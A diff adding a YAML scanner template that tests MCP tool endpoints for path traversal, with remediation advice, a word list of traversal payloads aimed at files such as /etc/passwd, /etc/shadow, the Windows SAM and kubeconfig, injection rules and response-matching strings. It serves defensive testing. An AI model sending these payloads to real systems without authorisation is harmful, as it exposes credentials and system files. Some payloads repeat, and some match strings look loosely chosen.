@@ -1,0 +1,221 @@
+---
+id: MCP_PATH_TRAVERSAL_PARAMETER_INJECTION
+
+info:
+  name: "MCP: Path Traversal Parameter Injection"
+  description: >
+    Tests whether MCP tool endpoints are vulnerable to path traversal attacks through
+    parameter manipulation. This test attempts to inject malicious path sequences into
+    function parameters to access files outside the intended directory, potentially
+    leading to sensitive file disclosure and system compromise.
+  details: >
+    Test idea:
+    - Inject path traversal payloads into various parameter fields of MCP tool calls
+    - Test common path traversal techniques including directory traversal sequences,
+      URL encoding, and alternative path separators
+    - Attempt to access sensitive system files, configuration files, and user data
+    - Test for path traversal in different parameter contexts (file paths, directory
+      operations, file uploads, etc.)
+    - This template targets MCP endpoints that interact with file systems and flags
+      successful path traversal attempts through response analysis.
+  impact: >
+    Successful path traversal through MCP parameters can lead to:
+    - Sensitive file disclosure and data exfiltration
+    - Configuration file access and system information exposure
+    - User credential and authentication data access
+    - System file manipulation and potential code execution
+    - Privilege escalation through sensitive file access
+  remediation: |
+    To prevent path traversal through MCP parameters:
+    
+    1. **Input Validation**: Implement strict input validation for all file path parameters. Validate path formats and reject suspicious patterns.
+    
+    2. **Path Sanitization**: Sanitize all file path parameters to remove or escape directory traversal sequences and special characters.
+    
+    3. **Canonical Path Resolution**: Use canonical path resolution to ensure paths are properly normalized and restricted to intended directories.
+    
+    4. **Directory Restrictions**: Implement strict directory restrictions that prevent access to files outside authorized directories.
+    
+    5. **Path Allowlisting**: Use allowlists for file paths where possible. Only permit predefined, safe file paths and reject any attempts to access unauthorized files.
+    
+    6. **File System Isolation**: Implement proper file system isolation to prevent access to sensitive system directories and files.
+    
+    7. **Error Handling**: Implement secure error handling that doesn't reveal file system structure or internal system details.
+    
+    8. **Logging and Monitoring**: Log all file access attempts and monitor for suspicious path traversal patterns.
+    
+    9. **Regular Security Testing**: Conduct regular security testing to identify and fix path traversal vulnerabilities.
+    
+    10. **Access Controls**: Implement proper access controls for file operations and verify user permissions before file access.
+  category:
+    name: MCP_SECURITY
+    shortName: MCP_SEC
+    displayName: Model Context Protocol (MCP) Security
+  subCategory: MCP_PATH_TRAVERSAL_PARAMETER_INJECTION
+  severity: HIGH
+  tags:
+    - mcp
+    - path-traversal
+    - parameter-injection
+    - file-security
+    - llm-security
+  references:
+    - https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control
+    - https://cwe.mitre.org/data/definitions/22.html
+    - https://owasp.org/www-project-llm-security-top-10/
+  cwe:
+    - CWE-22
+    - CWE-20
+    - CWE-74
+  cve:
+    - CVE-2023-41031
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+wordLists:
+  pathTraversalPayloads:
+    - "../../../etc/passwd"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "../../../etc/shadow"
+    - "..\\..\\..\\windows\\system32\\config\\sam"
+    - "../../../etc/hosts"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "../../../var/log/auth.log"
+    - "..\\..\\..\\windows\\system32\\logfiles\\w3svc1\\ex"
+    - "../../../etc/ssh/sshd_config"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\services"
+    - "../../../etc/mysql/my.cnf"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\protocol"
+    - "../../../etc/apache2/apache2.conf"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\networks"
+    - "../../../etc/nginx/nginx.conf"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\lmhosts"
+    - "../../../etc/php/php.ini"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\networks"
+    - "../../../etc/postgresql/postgresql.conf"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\services"
+    - "../../../etc/redis/redis.conf"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\protocol"
+    - "../../../etc/mongodb/mongod.conf"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\lmhosts"
+    - "../../../etc/docker/daemon.json"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "../../../etc/kubernetes/kubeconfig"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\services"
+    - "../../../etc/ssl/openssl.cnf"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\protocol"
+    - "../../../etc/cron.d/crontab"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\networks"
+    - "../../../etc/sudoers"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\lmhosts"
+    - "../../../etc/fstab"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "../../../etc/group"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\services"
+    - "../../../etc/gshadow"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\protocol"
+    - "../../../etc/login.defs"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\networks"
+    - "../../../etc/pam.d/common-auth"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\lmhosts"
+    - "../../../etc/pam.d/common-password"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "../../../etc/pam.d/common-session"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\services"
+    - "../../../etc/pam.d/common-account"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\protocol"
+    - "../../../etc/pam.d/common-session-noninteractive"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\networks"
+    - "../../../etc/pam.d/common-session-noninteractive"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\lmhosts"
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    eq: POST
+  request_payload:
+    contains_all:
+      - jsonrpc
+      - method
+      - params
+    for_one:
+      key:
+        regex: .*
+        extractMultiple: payloadKeys
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            params.arguments.${payloadKeys}: "${pathTraversalPayloads}"
+        - add_body_param:
+            params.arguments.path: "${pathTraversalPayloads}"
+        - add_body_param:
+            params.arguments.file: "${pathTraversalPayloads}"
+        - add_body_param:
+            params.arguments.directory: "${pathTraversalPayloads}"
+        - add_body_param:
+            params.arguments.filename: "${pathTraversalPayloads}"
+validate:
+  response_payload:
+    contains_either:
+      - "root:"
+      - "admin:"
+      - "user:"
+      - "daemon:"
+      - "bin:"
+      - "sys:"
+      - "sync:"
+      - "games:"
+      - "man:"
+      - "mail:"
+      - "news:"
+      - "uucp:"
+      - "proxy:"
+      - "www-data:"
+      - "backup:"
+      - "list:"
+      - "irc:"
+      - "gnats:"
+      - "nobody:"
+      - "systemd-timesync:"
+      - "systemd-network:"
+      - "systemd-resolve:"
+      - "systemd-bus-proxy:"
+      - "syslog:"
+      - "messagebus:"
+      - "_apt:"
+      - "uuidd:"
+      - "lightdm:"
+      - "whoopsie:"
+      - "avahi-autoipd:"
+      - "avahi:"
+      - "dnsmasq:"
+      - "colord:"
+      - "speech-dispatcher:"
+      - "hplip:"
+      - "kernoops:"
+      - "pulse:"
+      - "rtkit:"
+      - "saned:"
+      - "usbmux:"
+      - "mysql:"
+      - "postgres:"
+      - "redis:"
+      - "mongodb:"
+      - "docker:"
+      - "kubernetes:"
+      - "ssl:"
+      - "cron:"
+      - "sudo:"
+      - "fstab:"
+      - "group:"
+      - "gshadow:"
+      - "login:"
+      - "pam:"
+      - "password:"
+      - "session:"
+      - "account:"
+      - "noninteractive:"
